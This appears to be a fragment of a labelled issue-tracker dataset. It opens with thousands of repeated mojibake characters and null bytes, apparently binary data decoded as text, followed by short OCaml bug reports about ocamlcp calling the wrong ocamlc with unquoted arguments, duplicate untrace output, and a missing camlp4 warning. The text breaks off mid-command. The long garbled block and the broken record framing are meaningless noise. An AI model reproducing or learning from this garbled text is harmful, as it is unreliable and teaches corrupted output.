Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿\u0000Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿\u0000Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿\u0000Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿\n"},{"labels":["bug"],"text":"**Original bug ID:** 1939\n**Reporter:** administrator\n**Status:** closed\n**Resolution:** fixed\n**Priority:** normal\n**Severity:** minor\n**Category:** ~DO NOT USE (was: OCaml general)\n\n## Bug description\n\nJames Leifer <James.Leifer@inria.fr> writes:\n\n> Salut,\n>\n> Some trivial bugs...\n>\n> This relates to Ocaml 3.08pl2 (on Debian woody).\n\nOf course I meant 3.07pl2.  -J\n                     ^\n"},{"labels":["bug"],"text":"**Original bug ID:** 1938\n**Reporter:** administrator\n**Status:** closed\n**Resolution:** fixed\n**Priority:** normal\n**Severity:** minor\n**Category:** ~DO NOT USE (was: OCaml general)\n\n## Bug description\n\nSalut,\n\nSome trivial bugs...\n\nThis relates to Ocaml 3.08pl2 (on Debian woody).\n\nIn both tools/ocamlcp.ml and tools/ocamlmktop.ml there is a Sys.command\ncall to ocamlc: the ocamlc that gets run is the one in the $PATH not\nthe one that was installed.  I noticed this when working with multiple\nversions of Ocaml on my system.\n\nAlso, the arguments are not safely quoted, so for example\n\n   ocamlcp \"cou cou.ml\"      \n\nfails but\n\n   ocamlc \"cou cou.ml\"\n\nsucceeds.\n\n-James\n"},{"labels":["bug"],"text":"**Original bug ID:** 1936\n**Reporter:** administrator\n**Status:** closed\n**Resolution:** fixed\n**Priority:** normal\n**Severity:** minor\n**Category:** ~DO NOT USE (was: OCaml general)\n\n## Bug description\n\nFull_Name: Diego Olivier Fernandez Pons\nVersion: 3.04 3.06\nOS: Linux\nSubmission from: aurore.edite-de-paris.com.fr (132.227.65.18)\n\n\n        Objective Caml version 3.06\n\n# let f = fun x -> x + 1;;\nval f : int -> int = <fun>\n# #trace f;;\nf is now traced.\n# let f = fun x -> x + 2;;\nval f : int -> int = <fun>\n# #trace f;;\nf is now traced.\n# f 0;;\nf <-- 0\nf --> 2\n- : int = 2\n# #untrace_all;;\nf is no longer traced.\nf is no longer traced.\n# f 0;;\n- : int = 1\n"},{"labels":["bug"],"text":"**Original bug ID:** 1935\n**Reporter:** administrator\n**Status:** closed\n**Resolution:** fixed\n**Priority:** normal\n**Severity:** minor\n**Category:** ~DO NOT USE (was: OCaml general)\n\n## Bug description\n\nFull_Name: Artem Prysyznuk\nVersion: 3.07pl2\nOS: RedHat 9\nSubmission from: 213.156.75.17.priocom.com (213.156.75.17)\n\n\ncamlp4r not track wrong quotes. Example:\n\nWrong source:\n\n$ cat err.ml\nlet str = \"Wrong quote \\s\";;\n\nIf I compile w/o camlp4 all ok, compiler print warning message:\n\n$ ocamlc -c err.ml\nFile \"err.ml\", line 1, characters 23-25:\nWarning: Illegal backslash escape in string\n\nBut if I pass source through Camlp4, message loosing:\n\n$ ocamlc -pp camlp4o -c 